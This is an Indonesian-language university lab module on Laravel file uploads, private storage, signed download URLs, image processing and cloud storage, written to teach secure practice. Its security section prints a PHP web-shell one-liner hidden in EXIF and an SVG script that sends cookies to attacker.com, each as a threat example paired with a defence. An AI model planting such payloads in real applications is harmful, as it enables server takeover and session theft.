# MODUL PRAKTIKUM 07
## File Management, Media Handling, & Review Milestone Proyek
### Mata Kuliah: Pemrograman Web Lanjut (3 SKS)

---

## DAFTAR ISI
1. [Tujuan Pembelajaran](#1-tujuan-pembelajaran)
2. [Anatomi Filesystem Laravel 11/12 & Flysystem Abstraction](#2-anatomi-filesystem-laravel-1112--flysystem-abstraction)
3. [Ancaman Keamanan File Upload & Malware Prevention](#3-ancaman-keamanan-file-upload--malware-prevention)
4. [Validasi Modern Menggunakan Rule File Object](#4-validasi-modern-menggunakan-rule-file-object)
5. [Pemisahan Storage: Dokumen Publik vs Berkas Sensitif Privat](#5-pemisahan-storage-dokumen-publik-vs-berkas-sensitif-privat)
6. [Pengamanan Berkas Privat Menggunakan Temporary Signed URLs](#6-pengamanan-berkas-privat-menggunakan-temporary-signed-urls)
7. [Image Manipulation: Resize, Watermarking & Konversi WebP (Intervention Image v3)](#7-image-manipulation-resize-watermarking--konversi-webp-intervention-image-v3)
8. [Integrasi Multi-Disk Cloud Object Storage (S3 / Supabase)](#8-integrasi-multi-disk-cloud-object-storage-s3--supabase)
9. [Troubleshooting & Gotchas di Lingkungan Produksi](#9-troubleshooting--gotchas-di-lingkungan-produksi)
10. [Checklist Kesiapan Milestone 1 UTS (Konsolidasi Materi Minggu 1-7)](#10-checklist-kesiapan-milestone-1-uts-konsolidasi-materi-minggu-1-7)

---

## 1. TUJUAN PEMBELAJARAN
Setelah menyelesaikan modul praktikum ini, mahasiswa diharapkan mampu:
1. Memahami arsitektur abstraksi *Filesystem* Laravel berbasis Flysystem.
2. Membedakan penanganan aset publik (`storage/app/public`) dan berkas rahasia privat (`storage/app/private`).
3. Mencegah berbagai vektor serangan siber pada modul upload: *Remote Code Execution* (RCE), *Path Traversal*, *Polyglot Files*, dan *SVG Stored XSS*.
4. Mengimplementasikan pengunduhan berkas aman menggunakan *Temporary Signed URLs* dan *Streamed Responses*.
5. Melakukan manipulasi gambar dinamis (*auto-resize*, *watermarking*, *EXIF metadata stripping*, dan konversi WebP).
6. Mengonfigurasi integrasi *Cloud Object Storage* (AWS S3 / Supabase Storage) tanpa mengubah kode bisnis aplikasi.
7. Memvalidasi kesiapan repositori dan arsitektur kode menghadapi evaluasi Ujian Tengah Semester (UTS Milestone 1).

---

## 2. ANATOMI FILESYSTEM LARAVEL 11/12 & FLYSYSTEM ABSTRACTION

Pada pemrograman PHP native jadul, pengembang terbiasa memindahkan berkas menggunakan fungsi `move_uploaded_file($_FILES['foto']['tmp_name'], 'uploads/' . $_FILES['foto']['name'])`. Pola ini mengikat aplikasi secara kaku (*tightly coupled*) pada sistem berkas lokal server dan rentan terhadap berbagai serangan siber.

Laravel menggunakan library **Flysystem** (oleh Frank de Jonge) yang menyediakan lapisan abstraksi antarmuka berkas yang seragam. 

> [!NOTE]
> Dengan abstraksi Flysystem, kode aplikasi berinteraksi dengan kontrak API yang seragam (`Storage::put()`, `Storage::get()`, `Storage::delete()`), baik berkas tersebut disimpan di harddisk lokal, flash drive, Amazon S3, Cloudflare R2, maupun Supabase Storage.

### Struktur Direktori Penyimpanan Laravel 11/12:
- `storage/app/private/`: Tempat penyimpanan berkas rahasia (default disk `local`). Berkas di sini **TIDAK BISA** diakses langsung melalui peramban web oleh siapapun.
- `storage/app/public/`: Berkas yang boleh diakses publik (avatar, thumbnail). Agar dapat diakses via URL web, direktori ini harus ditautkan ke direktori publik:
  ```bash
  php artisan storage:link
  ```
  Perintah ini membuat symbolic link (*symlink*) dari `public/storage` mengarah ke `storage/app/public`.

---

## 3. ANCAMAN KEAMANAN FILE UPLOAD & MALWARE PREVENTION

Menyediakan fitur *upload* berkas sama saja dengan membuka pintu bagi pihak luar untuk menulis berkas ke dalam server Anda. Jika tidak diproteksi dengan ketat, penyerang dapat mengeksploitasi server melalui beberapa vektor serangan malware dan injeksi kode:

### A. Bahaya Remote Code Execution (RCE)
Jika penyerang berhasil mengunggah berkas `shell.php` ke folder publik, ia dapat membuka URL `https://aplikasi.com/uploads/shell.php` di peramban. Web server (Nginx/Apache) akan mengeksekusi script PHP tersebut, memberikan penyerang kendali penuh (*backdoor shell*) atas server basis data dan sistem operasi.

### B. Serangan Berkas Polyglot & Malware EXIF Injection
Penyerang dapat menyisipkan payload script PHP jahat ke dalam metadata EXIF sebuah gambar JPEG yang valid:
```
[Header JPEG yang Valid] + [Komentar EXIF: <?php system($_GET['cmd']); ?>]
```
Jika file ini diunggah dan server salah mengonfigurasi ekstensi atau mengeksekusinya, malware akan aktif. 
**Pencegahan:** Selalu lakukan pemrosesan ulang (*re-encoding*) gambar menggunakan library seperti Intervention Image. Proses ini otomatis membuang (*strip*) seluruh metadata EXIF tersembunyi.

### C. Bahaya Berkas SVG & Serangan Stored Cross-Site Scripting (XSS)
Berkas SVG (*Scalable Vector Graphics*) sebenarnya adalah dokumen XML. Di dalam berkas SVG, penyerang dapat menyisipkan kode JavaScript:
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
  </script>
</svg>
```
Saat admin membuka berkas SVG tersebut di peramban, script langsung dieksekusi dan sesi admin dicuri!
**Pencegahan:** Jangan pernah mengizinkan ekstensi `svg` pada upload umum kecuali telah melewati sanitasi ketat (*XML sanitizer*).

### D. Konfigurasi Web Server untuk Memblokir Eksekusi PHP di Folder Storage
Di server produksi Nginx, blokir pengeksekusian script PHP di dalam seluruh folder upload/storage:
```nginx
location ~* /(uploads|storage)/.*\.php$ {
    deny all;
    return 404;
}
```

### E. Empat Aturan Emas Keamanan File Upload:
1. **Jangan Percayai Nama Berkas Klien:** Selalu buat nama acak unik di sisi server menggunakan *UUID* atau *hash* SHA-256 (`$file->hashName()`).
2. **Validasi MIME-Type di Server:** Ekstensi `.jpg` bisa dipalsukan. Laravel memeriksa *magic bytes* berkas melalui modul PHP `fileinfo` untuk memverifikasi tipe berkas sebenarnya.
3. **Isolasi Berkas Sensitif:** Jangan pernah menyimpan dokumen identitas (KTP, slip gaji, rekam medis) di dalam disk `public`.
4. **Re-encode Media Gambar:** Konversi gambar ke WebP untuk memastikan file benar-benar gambar valid dan membersihkan malware.

---

## 4. VALIDASI MODERN MENGGUNAKAN RULE FILE OBJECT

Laravel menyediakan fluent builder `Illuminate\Validation\Rules\File` untuk menyusun aturan validasi berkas yang ekspresif, aman, dan mudah dibaca.

### Contoh Form Request: `app/Http/Requests/UploadIdentityDocumentRequest.php`

```php
namespace App\Http\Requests;

use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Validation\Rules\File;

class UploadIdentityDocumentRequest extends FormRequest
{
    public function authorize(): bool
    {
        return $this->user() !== null;
    }

    public function rules(): array
    {
        return [
            // Validasi dokumen KTP / Ijazah (PDF atau Gambar, maks 3MB)
            'document' => [
                'required',
                File::types(['pdf', 'jpg', 'jpeg', 'png'])
                    ->max(3 * 1024), // 3 MB (satuan kilobyte)
            ],

            // Validasi Avatar (Wajib gambar, maks 2MB, dimensi minimal 200x200 px)
            'avatar' => [
                'nullable',
                File::image()
                    ->min(10) // minimal 10 KB
                    ->max(2 * 1024) // maksimal 2 MB
                    ->dimensions(File::image()->dimensions()->minWidth(200)->minHeight(200)),
            ],
            
            'type' => ['required', 'string', 'in:ktp,ijazah,kartu_keluarga'],
        ];
    }

    public function messages(): array
    {
        return [
            'document.required' => 'Dokumen wajib diunggah.',
            'document.max' => 'Ukuran berkas dokumen tidak boleh melebihi 3 Megabyte.',
            'avatar.dimensions' => 'Resolusi foto profil minimal adalah 200x200 pixel.',
        ];
    }
}
```

---

## 5. PEMISAHAN STORAGE: DOKUMEN PUBLIK VS BERKAS SENSITIF PRIVAT

### Skenario 1: Menyimpan Berkas Publik (Avatar Pengguna)
Berkas avatar disimpan ke disk `public`. URL-nya dapat diakses langsung oleh peramban klien.

```php
namespace App\Services;

use App\Models\User;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;

class ProfileMediaService
{
    public function updateAvatar(User $user, UploadedFile $file): string
    {
        // 1. Hapus avatar lama jika ada
        if ($user->avatar_path && Storage::disk('public')->exists($user->avatar_path)) {
            Storage::disk('public')->delete($user->avatar_path);
        }

        // 2. Simpan dengan nama hash otomatis di folder 'avatars'
        $path = $file->store('avatars', 'public');

        // 3. Simpan relative path ke database
        $user->update(['avatar_path' => $path]);

        // 4. Return URL publik lengkap: http://domain.test/storage/avatars/8f4b1d6...jpg
        return Storage::disk('public')->url($path);
    }
}
```

### Skenario 2: Menyimpan Berkas Sensitif Privat (KTP Mahasiswa)
Dokumen KTP disimpan di disk `local` (`storage/app/private`). Tidak ada URL statis publik yang mengarah ke berkas ini!

```php
namespace App\Services;

use App\Models\User;
use App\Models\IdentityDocument;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Str;

class IdentityDocumentService
{
    public function storePrivateDocument(User $user, UploadedFile $file, string $type): IdentityDocument
    {
        // Buat nama berkas acak dengan UUID agar tidak dapat ditebak
        $safeFileName = Str::uuid() . '.' . $file->getClientOriginalExtension();
        
        // Simpan ke direktori terisolasi: storage/app/private/documents/{user_id}/
        $path = $file->storeAs(
            "documents/{$user->id}",
            $safeFileName,
            'local' // Disk privat default
        );

        return IdentityDocument::create([
            'user_id' => $user->id,
            'type' => $type,
            'original_filename' => $file->getClientOriginalName(),
            'storage_path' => $path,
            'mime_type' => $file->getClientMimeType(),
            'file_size_bytes' => $file->getSize(),
        ]);
    }
}
```

---

## 6. PENGAMANAN BERKAS PRIVAT MENGGUNAKAN TEMPORARY SIGNED URLS

Bagaimana jika pengguna yang sah (atau staf verifikator) perlu melihat dokumen KTP tersebut? Kita **tidak boleh** memindahkan berkas ke folder publik! 

Solusi industri adalah **Temporary Signed URLs**: tautan unduhan yang dilengkapi tanda tangan digital kriptografis (HMAC SHA-256) berbasis kunci enkripsi aplikasi (`APP_KEY`) dan memiliki masa kedaluwarsa waktu.

```
URL Publik Biasa:
https://kampus.ac.id/uploads/ktp-123.pdf  <-- BERBAHAYA! Bisa diakses publik tanpa login

Temporary Signed URL:
https://kampus.ac.id/documents/42/download?expires=1728212400&signature=9a8c7b6...  <-- AMAN!
- Hanya berlaku selama masa expired (misal: 15-30 menit).
- Mengubah 1 huruf di URL merusak signature -> HTTP 403 Invalid Signature.
```

### Implementasi:
#### 1. Mendaftarkan Rute di `routes/web.php`
```php
use App\Http\Controllers\DocumentDownloadController;
use Illuminate\Support\Facades\Route;

Route::middleware(['auth'])->group(function () {
    Route::get('/documents/{document}/download', [DocumentDownloadController::class, 'download'])
        ->name('documents.download')
        ->middleware('signed'); // Otomatis validasi query parameter HMAC
});
```

#### 2. Menghasilkan Tautan Sementara di Controller / Model
```php
use Illuminate\Support\Facades\URL;

$temporaryUrl = URL::temporarySignedRoute(
    'documents.download',
    now()->addMinutes(15),
    ['document' => $document->id]
);
```

#### 3. Controller Verifikasi & Streaming: `app/Http/Controllers/DocumentDownloadController.php`
```php
namespace App\Http\Controllers;

use App\Models\IdentityDocument;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Gate;
use Illuminate\Support\Facades\Storage;
use Symfony\Component\HttpFoundation\StreamedResponse;

class DocumentDownloadController extends Controller
{
    public function download(Request $request, IdentityDocument $document): StreamedResponse
    {
        // 1. Otorisasi kepemilikan dokumen via Policy
        Gate::authorize('view', $document);

        // 2. Pastikan berkas fisik masih ada di disk privat
        if (! Storage::disk('local')->exists($document->storage_path)) {
            abort(404, 'Berkas fisik tidak ditemukan pada storage server.');
        }

        // 3. Alirkan berkas langsung ke peramban tanpa membongkar path asli server
        return Storage::disk('local')->download(
            $document->storage_path,
            $document->original_filename,
            [
                'Content-Type' => $document->mime_type,
                'Cache-Control' => 'no-cache, private, no-store, must-revalidate',
            ]
        );
    }
}
```

---

## 7. IMAGE MANIPULATION: RESIZE, WATERMARKING & KONVERSI WEBP (INTERVENTION IMAGE V3)

Mengizinkan pengguna mengunggah foto berukuran 10MB langsung dari kamera ponsel dapat membebani kapasitas server dan memperlambat waktu pemuatan halaman. Kita wajib melakukan optimasi:
1. Menyesuaikan resolusi gambar (*resize / fit crop*).
2. Membubuhkan **Watermark** (logo atau teks hak cipta / status verifikasi).
3. Mengonversi format berkas ke format modern **WebP** yang menghemat bandwidth hingga 70% dan membersihkan metadata EXIF berbahaya.

### Instalasi Intervention Image v3 untuk Laravel:
```bash
composer require intervention/image-laravel
```

### Implementasi Service Lengkap: `app/Services/ImageMediaService.php`

```php
namespace App\Services;

use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;
use Intervention\Image\Laravel\Facades\Image;

class ImageMediaService
{
    /**
     * Crop 400x400 px, bubuhkan Watermark, dan konversi ke format WebP.
     */
    public function processAvatarWithWatermark(UploadedFile $file, ?string $watermarkText = 'VERIFIED'): string
    {
        // 1. Baca berkas gambar
        $image = Image::read($file);

        // 2. Potong persegi tengah (Cover Crop 400x400 px)
        $image->cover(400, 400);

        // 3. Tambahkan Watermark Teks Dinamis di sudut kanan bawah
        if ($watermarkText) {
            $image->text($watermarkText, 380, 380, function ($font) {
                $font->size(20);
                $font->color('rgba(255, 255, 255, 0.6)');
                $font->align('right');
                $font->valign('bottom');
            });
        }

        // 4. Konversi ke format WebP (Otomatis membuang metadata EXIF)
        $encodedWebp = $image->toWebp(quality: 80);

        // 5. Simpan stream binary ke disk 'public'
        $filename = 'avatars/' . Str::uuid() . '.webp';
        Storage::disk('public')->put($filename, (string) $encodedWebp);

        return $filename;
    }

    /**
     * Menempelkan Watermark Gambar Logo Transparan (PNG) di atas gambar produk/sertifikat.
     */
    public function placeLogoWatermark(UploadedFile $file, string $watermarkLogoPath): string
    {
        $image = Image::read($file);

        // Pasang logo watermark di pojok kanan bawah dengan opacity 60%
        $image->place(
            element: $watermarkLogoPath,
            position: 'bottom-right',
            offset_x: 20,
            offset_y: 20,
            opacity: 60
        );

        $encodedWebp = $image->toWebp(quality: 85);
        $filename = 'certificates/' . Str::uuid() . '.webp';
        Storage::disk('public')->put($filename, (string) $encodedWebp);

        return $filename;
    }
}
```

---

## 8. INTEGRASI MULTI-DISK CLOUD OBJECT STORAGE (S3 / SUPABASE)

Pada skala produksi, menyimpan berkas statis di disk lokal server monolitik memiliki banyak kelemahan (*single point of failure*, kesulitan scaling horizontal *multi-instance*). Kita menggunakan layanan **Cloud Object Storage** berbasis protokol Amazon S3 (seperti AWS S3, Cloudflare R2, MinIO, atau Supabase Storage).

### 1. Pasang Driver AWS S3 Flysystem
```bash
composer require league/flysystem-aws-s3-v3 "^3.0"
```

### 2. Konfigurasi `config/filesystems.php` (Driver Supabase / S3)
```php
'disks' => [
    'local' => [
        'driver' => 'local',
        'root' => storage_path('app/private'),
        'serve' => false,
        'throw' => false,
    ],

    'public' => [
        'driver' => 'local',
        'root' => storage_path('app/public'),
        'url' => env('APP_URL').'/storage',
        'visibility' => 'public',
        'throw' => false,
    ],

    // Konfigurasi Cloud S3 / Supabase Storage
    's3' => [
        'driver' => 's3',
        'key' => env('AWS_ACCESS_KEY_ID'),
        'secret' => env('AWS_SECRET_ACCESS_KEY'),
        'region' => env('AWS_DEFAULT_REGION', 'us-east-1'),
        'bucket' => env('AWS_BUCKET'),
        'url' => env('AWS_URL'),
        'endpoint' => env('AWS_ENDPOINT'), // Digunakan jika memakai Supabase/MinIO
        'use_path_style_endpoint' => env('AWS_USE_PATH_STYLE_ENDPOINT', false),
        'throw' => true,
    ],
],
```

### 3. Pengaturan `.env` untuk Supabase Storage
```dotenv
FILESYSTEM_DISK=s3
AWS_ACCESS_KEY_ID=your-supabase-project-ref
AWS_SECRET_ACCESS_KEY=your-supabase-anon-or-service-role-key
AWS_DEFAULT_REGION=ap-southeast-1
AWS_BUCKET=nama-bucket-anda
AWS_ENDPOINT=https://your-project-ref.supabase.co/storage/v1/s3
AWS_USE_PATH_STYLE_ENDPOINT=true
```

> [!TIP]
> **Keajaiban Abstraksi:** Karena Controller Anda menulis kode `Storage::disk(config('filesystems.default'))->put(...)`, ketika Anda beralih dari penyimpanan disk `local` ke `s3` di file `.env`, aplikasi Anda langsung terhubung ke cloud storage **tanpa perlu mengubah satu baris pun kode PHP Controller atau Service Anda!**

---

## 9. TROUBLESHOOTING & GOTCHAS DI LINGKUNGAN PRODUKSI

### 1. Error Symlink di Sistem Operasi Windows
- **Gejala:** Muncul error `symlink(): Cannot create symlink, error code 1314` saat menjalankan `php artisan storage:link`.
- **Solusi:** Windows membutuhkan hak akses administrator untuk membuat tautan simbolik. Buka PowerShell atau Command Prompt dengan **Run as Administrator**, atau aktifkan **Developer Mode** di pengaturan Windows 10/11.

### 2. Berkas Gagal Upload Melebihi 2MB (PHP Limit)
- **Gejala:** Validasi gagal tanpa pesan error jelas, atau `$_FILES` bernilai kosong saat mengunggah berkas di atas 2MB.
- **Penyebab:** Konfigurasi bawaan `php.ini` membatasi ukuran maksimal berkas sebesar 2MB.
- **Solusi:** Edit file `php.ini` Anda dan sesuaikan direktif:
  ```ini
  upload_max_filesize = 20M
  post_max_size = 25M
  memory_limit = 256M
  ```
  Kemudian restart web server / PHP-FPM Anda.

### 3. Permission Denied pada Folder `storage/` di Linux Server
- **Gejala:** Error `The stream or file "/var/www/storage/..." could not be opened: failed to open stream: Permission denied`.
- **Solusi:** Berikan izin kepemilikan folder kepada web server:
  ```bash
  sudo chown -R www-data:www-data storage bootstrap/cache
  sudo chmod -R 775 storage bootstrap/cache
  ```

---

## 10. CHECKLIST KESIAPAN MILESTONE 1 UTS (KONSOLIDASI MATERI MINGGU 1-7)

Minggu depan adalah sesi **Ujian Tengah Semester (UTS)** yang berupa evaluasi *Midterm Project Defense / Code Review*. Gunakan matriks checklist di bawah ini untuk mengaudit proyek tim Anda sebelum dievaluasi oleh Dosen & Asisten:

| Domain / Aspek | Kriteria Minimal Kelulusan Milestone 1 UTS | Status |
| :--- | :--- | :---: |
| **Arsitektur Kode** | • Controller ramping (*Skinny Controller* $\le 25$ baris).<br>• Validasi terpusat pada *Form Request* mandiri.<br>• Logika transaksi bisnis diisolasi di *Service Layer* yang independen dari HTTP (`$request`/`response()`).<br>• Data masukan kompleks dibungkus dalam *Data Transfer Object* (DTO) bertipe tegas. | [ ] |
| **Database & Migration** | • Skema migrasi ternormalisasi dengan *Foreign Key Constraints* dan *Indexing* pada kolom pencarian.<br>• *Model Factories* dan *Seeder* batch chunk performa tinggi.<br>• Transaksi ACID (`DB::transaction`) dan *Pessimistic Locking* (`lockForUpdate()`) pada operasi kuota/keuangan sensitif. | [ ] |
| **Eloquent ORM** | • Relasi kompleks diterapkan (*Polymorphic* / *Custom Pivot* / *Has-Many-Through*).<br>• Bebas masalah query **N+1** (aktifkan `Model::preventLazyLoading(! app()->isProduction())`).<br>• Menggunakan *Eager Loading* dengan sparse fieldsets dan *Local/Global Scopes*. | [ ] |
| **Otentikasi & RBAC** | • Starter kit Laravel Breeze terpasang rapi.<br>• Sistem RBAC multi-role terimplementasi (Spatie / Policy).<br>• Hak kepemilikan data diatur ketat via *Model Policy* (`update`/`delete`).<br>• *Super Admin Bypass hook* terpasang via `Gate::before()`.<br>• Fitur keamanan aktif (*Email Verification* & *Password Confirmation*). | [ ] |
| **Media & Storage** | • Pemisahan tegas disk `public` (avatar) dan disk `private` (dokumen rahasia KTP/Ijazah).<br>• File name di-hash dengan UUID, tidak menyimpan nama asli klien.<br>• Pengunduhan dokumen rahasia wajib melalui *Temporary Signed URLs* dengan otorisasi Policy.<br>• Optimasi gambar otomatis (Resize/Watermark/WebP). | [ ] |
| **Git & Repositori** | • Menggunakan *Conventional Commits* yang rapi.<br>• Menggunakan fitur branch terpisah untuk tiap fitur (`feat/...`).<br>• File `README.md` repositori memuat panduan setup proyek lokal lengkap (*migration*, *seeder*, `.env.example*, `storage:link`). | [ ] |

---

## 11. LEMBAR TUGAS MANDIRI
Selesaikan seluruh instruksi tugas pada [TUGAS-07.md](TUGAS-07.md) sebagai latihan pemantapan akhir sebelum menghadapi UTS.
